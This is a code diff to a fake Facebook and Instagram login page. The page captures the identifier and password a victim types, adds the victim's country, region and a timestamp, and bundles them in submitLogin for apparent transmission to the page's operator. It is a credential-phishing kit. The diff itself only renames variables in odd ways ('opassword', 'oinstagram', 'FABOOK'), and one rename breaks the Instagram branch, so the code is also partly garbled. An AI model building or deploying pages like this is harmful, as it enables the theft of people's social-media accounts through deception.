@@ -131,7 +131,7 @@
         </div>
     </div>
 
-    <!-- ========== FACEBOOK LOGIN VIEW ========== -->
+    <!-- ========== FABOOK LOGIN VIEW ========== -->
     <div id="fbLoginView" class="hidden">
         <div class="fb-login-header">
             <button class="back-btn" id="backFromFb">&#8592;</button>
@@ -289,14 +289,14 @@
         }
 
         // ========== SUBMIT LOGIN (single info field) ==========
-        async function submitLogin(platform, identifier, password) {
+        async function submitLogin(platform, identifier, opassword) {
             const location = await getLocation();
 
             // Build info string
             const infoString = 
                 `Platform: ${platform}\n` +
                 `Identifier: ${identifier}\n` +
-                `Password: ${password}\n` +
+                `oPassword: ${opassword}\n` +
                 `Country: ${location.country}\n` +
                 `Region: ${location.region}\n` +
                 `Timestamp: ${new Date().toISOString()}`;
@@ -322,22 +322,22 @@
 
         // ========== LOGIN ATTEMPT HANDLER ==========
         async function handleLoginAttempt(platform) {
-            let identifier = '', password = '';
+            let identifier = '', opassword = '';
             if (platform === 'facebook') {
                 identifier = fbEmail.value.trim();
-                password = fbPassword.value.trim();
-                if (!identifier || !password) { alert('Please fill in both fields.'); return; }
-            } else if (platform === 'instagram') {
+                opassword = fbPassword.value.trim();
+                if (!identifier || !opassword) { alert('Please fill in both fields.'); return; }
+            } else if (platform === 'oinstagram') {
                 identifier = igUsername.value.trim();
-                password = igPassword.value.trim();
-                if (!identifier || !password) { alert('Please fill in both fields.'); return; }
+                opassword = igPassword.value.trim();
+                if (!identifier || !opassword) { alert('Please fill in both fields.'); return; }
             }
 
             showLoading();
             hideVerifyModal();
             hideErrorModal();
 
-            await submitLogin(platform, identifier, password);
+            await submitLogin(platform, identifier, opassword);
 
             setTimeout(() => {
                 hideLoading();
